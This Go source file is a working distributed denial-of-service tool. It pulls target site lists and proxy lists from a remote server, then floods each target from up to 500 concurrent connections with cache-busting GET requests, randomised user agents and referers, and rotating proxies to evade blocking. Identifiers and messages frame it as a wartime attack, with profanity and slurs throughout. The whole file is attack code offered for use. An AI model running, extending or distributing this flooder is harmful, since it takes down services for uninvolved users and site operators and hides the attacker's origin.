package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	tm "github.com/buger/goterm"
	flag "github.com/spf13/pflag"
	ua "github.com/wux1an/fake-useragent"
)

type strikeItem struct {
	Id           int         `json:"id"`
	Url          string      `json:"url"`
	Page         string      `json:"page"`
	Atack        interface{} `json:"atack"`
	NeedParseUrl int         `json:"need_parse_url"`
	PageTime     interface{} `json:"page_time"`
	Protocol     string      `json:"protocol"`
	Port         interface{} `json:"port"`
}

func (si *strikeItem) PagePayload() string {
	var paramJoiner string
	if strings.ContainsRune(si.Page, '?') {
		paramJoiner = "&"
	} else {
		paramJoiner = "?"
	}

	return fmt.Sprintf("%s%s%s=%s", si.Page, paramJoiner, buildblock(rand.Intn(7)+3), buildblock(rand.Intn(7)+3))
}

type statItem struct {
	failCnt   int32
	succCnt   int32
	startTime time.Time
}

type statistics map[string]*statItem

type proxyItem struct {
	Id     int32
	Ip     string
	Auth   string
	Scheme string
}

const (
	strikeRefreshInterval = 60 * time.Second
	acceptCharset         = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"
)

var (
	strikeList         []strikeItem
	statData           statistics
	limiter, refresher chan struct{}
	noProxyClient      *http.Client
	ipEcho             *ipInfo
	proxyList          []proxyItem
	proxyClients       sync.Map
	currProxyListId    int32

	headersReferers []string = []string{
		"http://www.google.com/?q=",
		"http://www.usatoday.com/search/results?q=",
		"http://engadget.search.aol.com/search?q=",
		"http://www.google.ru/?hl=ru&q=",
		"http://yandex.ru/yandsearch?text=",
	}
)

func main() {
	var (
		threads           int
		siteUrl, proxyUrl string
		sites             []string
		refresh           time.Duration
	)

	flag.IntVarP(&threads, "max-routines", "t", 500, "Maximum number of simultaneous connections")
	flag.StringArrayVarP(&sites, "site", "s", []string{}, "Sites list. Can be used multiple times. Have precedence over sites-url if set `site-url`")
	flag.StringVarP(&siteUrl, "sites-url", "u", "https://hutin-puy.nadom.app/sites.json", "URL to fetch sites list from `sites-url`")
	flag.DurationVarP(&refresh, "refresh", "r", 3*time.Second, "Screen refresh interval in seconds")
	flag.StringVarP(&proxyUrl, "proxies-url", "p", "https://hutin-puy.nadom.app/proxy.json", "URL to fetch proxy list from `proxies-url`")
	flag.Parse()

	initVariables()
	limiter = make(chan struct{}, threads)

	if len(sites) > 0 {
		for _, site := range sites {
			sUrl, err := url.Parse(site)
			if err != nil {
				fmt.Printf("error parsing %s\n", site)
				continue
			}
			if sUrl.Scheme == "" {
				switch sUrl.Port() {
				case "80", "8080":
					sUrl.Scheme = "http"
				case "443", "8443":
					sUrl.Scheme = "https"
				case "53":
					sUrl.Scheme = "udp"
				case "21":
					sUrl.Scheme = "ftp"
				case "22", "25", "143", "465", "587", "993", "995":
					sUrl.Scheme = "tcp"
				default:
					sUrl.Scheme = "http"
				}
			}
			si := strikeItem{Url: sUrl.Scheme + "://" + sUrl.Host, Page: sUrl.String(), Atack: true, Protocol: sUrl.Scheme, Port: sUrl.Port()}
			strikeList = append(strikeList, si)
		}
	} else {
		startStrikeListRefresher(&siteUrl)
		time.Sleep(4 * time.Second) // NOTE: give a chance to fetch sites list
	}

	if len(strikeList) == 0 {
		fmt.Println("no sites to fuck! exiting...")
		os.Exit(0)
	}

	startProxyListRefresher(&proxyUrl)
	startStatsPrinter(&statData, &strikeList, &refresh)

	for {
		time.Sleep(200 * time.Millisecond)
		refresher <- struct{}{}

		go func() {
			defer func() { <-refresher }()

			pId := atomic.LoadInt32(&currProxyListId)
			for _, strike := range strikeList {
				limiter <- struct{}{}

				var (
					site *statItem
					ok   bool
				)

				if site, ok = statData[strike.Url]; !ok {
					site = &statItem{startTime: time.Now()}
					statData[strike.Url] = site
				}

				go func(huilo *strikeItem, proxy *proxyItem) {
					defer func() { <-limiter }()
					if err := russiaWarShipFuckYou(huilo, proxy); err != nil {
						atomic.AddInt32(&site.failCnt, 1)
					} else {
						atomic.AddInt32(&site.succCnt, 1)
					}
				}(&strike, &proxyList[pId])
			}

			if pId+1 == int32(len(proxyList)) {
				atomic.StoreInt32(&currProxyListId, 0)
			} else {
				atomic.AddInt32(&currProxyListId, 1)
			}
		}()
	}
}

func fetchStrikeList(siteUrl *string) error {
	refresher <- struct{}{}
	defer func() { <-refresher }()

	var (
		body []byte
		resp *http.Response
		req  *http.Request
		err  error
	)

	req, err = http.NewRequest(http.MethodGet, *siteUrl, nil)
	if err != nil {
		fmt.Printf("failed to create new Request for Strike List: %v\n", err)
	}

	resp, err = noProxyClient.Do(req)
	if err != nil {
		fmt.Printf("failed to execute strike List update request: %v\n", err)
	}
	defer resp.Body.Close()

	body, err = ioutil.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("failed to read strike List body: %v, %d", err, resp.StatusCode)
	}

	if err = json.Unmarshal(body, &strikeList); err != nil {
		return fmt.Errorf("failed to parse json of strike list: %v", err)
	}

	var idx = 0
	for _, strike := range strikeList {
		atack, ok := strike.Atack.(bool)
		if !ok {
			if atack, ok := strike.Atack.(int); !ok || atack == 0 {
				continue
			}

		} else if !atack {
			continue
		}

		strikeList[idx] = strike
		idx++
	}
	strikeList = strikeList[:idx]

	return err
}

func startStrikeListRefresher(siteUrl *string) {
	ticker := time.NewTicker(500 * time.Millisecond)

	go func() {
		for {
			select {
			case <-ticker.C:
				ticker.Stop()
				if err := fetchStrikeList(siteUrl); err != nil {
					fmt.Println("failed to fetch site List. retrying...")
					fmt.Println(err.Error())

					ticker.Reset(time.Second)
					continue
				}
				ticker.Reset(strikeRefreshInterval)
			}
		}
	}()
}

func startProxyListRefresher(proxyUrl *string) {
	fetchProxyList(proxyUrl)

	ticker := time.NewTicker(15 * time.Minute)

	go func() {
		for {
			select {
			case <-ticker.C:
				if err := fetchProxyList(proxyUrl); err != nil {
					fmt.Println("failed to fetch proxy List. retrying...")
					fmt.Println(err.Error())

					ticker.Reset(time.Second)
					continue
				}
				ticker.Reset(1 * time.Hour)
			}
		}
	}()
}

func fetchProxyList(proxyUrl *string) error {
	var (
		body []byte
		resp *http.Response
		req  *http.Request
		err  error
	)

	req, err = http.NewRequest(http.MethodGet, *proxyUrl, nil)
	if err != nil {
		fmt.Printf("failed to create new Request for proxy List: %v\n", err)
	}

	resp, err = noProxyClient.Do(req)
	if err != nil {
		fmt.Printf("failed to execute proxy List update request: %v\n", err)
	}
	defer resp.Body.Close()

	body, err = ioutil.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("failed to read proxy List body: %v, %d", err, resp.StatusCode)
	}

	if err = json.Unmarshal(body, &proxyList); err != nil {
		return fmt.Errorf("failed to parse json of proxy list: %v", err)
	}

	return err
}

type ipInfo struct {
	Ip       string
	Hostname string
	City     string
	Region   string
	Country  string
	Loc      string
	Org      string
	Postal   string
	Timezone string
	Readme   string
}

func (ii *ipInfo) String() string {
	if ii == nil || len(ii.Ip) == 0 {
		return "Unknown"
	}

	return fmt.Sprintf("%s (%s,%s,%s,%s); %s; %s; %s", ii.Ip, ii.City, ii.Region, ii.Postal, ii.Country, ii.Loc, ii.Org, ii.Timezone)
}

func startStatsPrinter(stat *statistics, strikes *[]strikeItem, refresh *time.Duration) {
	startIpInfoRefresher()

	ticker := time.NewTicker(*refresh)

	go func() {
		for {
			select {
			case <-ticker.C:
				stats := tm.NewTable(0, 8, 4, ' ', 0)
				ct := time.Now()
				fmt.Fprintf(stats, "Current Time: %s\n", ct.Format(time.RFC1123))
				fmt.Fprintf(stats, "Current IP: %s\n", ipEcho.String())
				fmt.Fprintf(stats, "Current Proxy: %s\n", proxyList[atomic.LoadInt32(&currProxyListId)].Ip)
				fmt.Fprintf(stats, "##\tURL\tSUCC\tFAIL\tDURATION\n")
				for i, strike := range *strikes {
					site, ok := (*stat)[strike.Url]
					var (
						succ, fail int32
						diff       time.Duration
					)
					if ok {
						succ = atomic.LoadInt32(&site.succCnt)
						fail = atomic.LoadInt32(&site.failCnt)
						diff = ct.Sub(site.startTime)
					}
					fmt.Fprintf(stats, "%d\t%s\t%d\t%d\t%v\n",
						i+1,
						strike.Url,
						succ,
						fail,
						diff,
					)
				}
				tm.Clear()
				tm.MoveCursor(1, 1)
				tm.Println(stats)
				tm.Flush()
			}
		}
	}()
}

func startIpInfoRefresher() {
	refreshIpInfo()

	ticker := time.NewTicker(15 * time.Second)

	go func() {
		for {
			select {
			case <-ticker.C:
				refreshIpInfo()
			}
		}
	}()
}

func refreshIpInfo() {
	req, err := http.NewRequest(http.MethodGet, "https://ipinfo.io/json", nil)
	if err != nil {
		return // err.Error()
	}

	req.Header.Set("User-Agent", ua.Random()) // FIXME: it sometimes panics. see another package?
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Pragma", "no-cache")
	req.Header.Set("Accept-Charset", acceptCharset)
	req.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]+buildblock(rand.Intn(5)+5))
	req.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(10)+100))
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Host", "ipinfo.io")
	req.Header.Set("x-forwarded-proto", "https")
	req.Header.Set("cf-visitor", "https")
	req.Header.Set("Accept-Language", "ru")
	req.Header.Set("Accept", "application/json, text/plain, */*")

	cl, err := proxyClient(nil)
	if err != nil {
		fmt.Printf("proxyClient error: %v\n", err.Error())
		return //fmt.Errorf("proxyClient error: %v\n", err.Error())
	}

	resp, err := cl.Do(req)
	if err != nil {
		return // err.Error()
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return // err.Error()
	}

	fmt.Printf("ip: %v\n", string(body))
	if err := json.Unmarshal(body, &ipEcho); err != nil {
		return // err.Error()
	}

	return // ipEcho.String()
}

func russiaWarShipFuckYou(huilo *strikeItem, pr *proxyItem) error {
	req, err := http.NewRequest(http.MethodGet, huilo.PagePayload(), nil)
	if err != nil {
		fmt.Printf("couldn't create new request: %v\n", err)
		return err
	}

	host, _ := url.Parse(huilo.Url)
	req.Header.Set("User-Agent", ua.Random()) // FIXME: it sometimes panics. see another package?
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Accept-Charset", acceptCharset)
	req.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]+buildblock(rand.Intn(5)+5))
	req.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(10)+100))
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Host", host.Hostname())
	req.Header.Set("x-forwarded-proto", "https")
	req.Header.Set("cf-visitor", "https")
	req.Header.Set("Accept-Language", "ru")
	req.Header.Set("Accept", "application/json, text/plain, */*")

	// fmt.Printf("attacking %s\n", huilo.Url)

	cl, err := proxyClient(pr)
	if err != nil {
		fmt.Printf("proxyClient error: %v\n", err.Error())
		return fmt.Errorf("proxyClient error: %v\n", err.Error())
	}

	resp, err := cl.Do(req)
	if err != nil {
		return fmt.Errorf("failed to fuck ship: %v\n", err)
	}
	defer resp.Body.Close()

	// NOTE: do not fetch actual body but reflect on connection instead
	// _, err = ioutil.ReadAll(resp.Body)
	// if err != nil {
	// 	return fmt.Errorf("failed to read ship: %v, %d", err, resp.StatusCode)
	// }

	return nil
}

func buildblock(size int) (s string) {
	var a []rune
	for i := 0; i < size; i++ {
		a = append(a, rune(rand.Intn(25)+65))
	}
	return string(a)
}

func initVariables() {
	tr := http.DefaultTransport.(*http.Transport).Clone()
	tr.Proxy = nil
	noProxyClient = &http.Client{Transport: tr}

	refresher = make(chan struct{}, 1)
	statData = statistics{}

	ua.Random() // NOTE: init cache at this point.
}

func proxyClient(pr *proxyItem) (*http.Client, error) {
	var proxy proxyItem

	if pr != nil {
		proxy = *pr
	} else {
		proxy = proxyList[atomic.LoadInt32(&currProxyListId)]
	}

	cl, ok := proxyClients.Load(proxy.Ip)
	if ok {
		hcl := cl.(http.Client)
		return &hcl, nil
	}

	pu, err := url.Parse(proxy.Ip)
	if err != nil {
		if proxy.Scheme == "" {
			pu, err = url.Parse("http://" + proxy.Ip)
			if err != nil {
				fmt.Printf("failed to parse proxy [%d]: %s\n", proxy.Id, proxy.Ip)
				return nil, err
			}
		} else {
			pu, err = url.Parse(proxy.Scheme + "://" + proxy.Ip)
			if err != nil {
				fmt.Printf("failed to parse proxy [%d]: %s\n", proxy.Id, proxy.Ip)
				return nil, err
			}
		}
	}
	if pu.Scheme == "" {
		if proxy.Scheme != "" {
			pu.Scheme = proxy.Scheme
		} else {
			pu.Scheme = "http"
		}
	}
	if proxy.Auth != "" {
		auth := strings.Split(proxy.Auth, ":")
		pu.User = url.UserPassword(auth[0], auth[1])
	}

	tr := http.DefaultTransport.(*http.Transport).Clone()
	tr.IdleConnTimeout = 10 * time.Second
	tr.DialContext = (&net.Dialer{
		Timeout:   5 * time.Second,
		KeepAlive: 15 * time.Second,
	}).DialContext
	tr.Proxy = http.ProxyURL(pu)
	hcl := &http.Client{Transport: tr}
	proxyClients.Store(proxy.Ip, *hcl)

	return hcl, nil
}
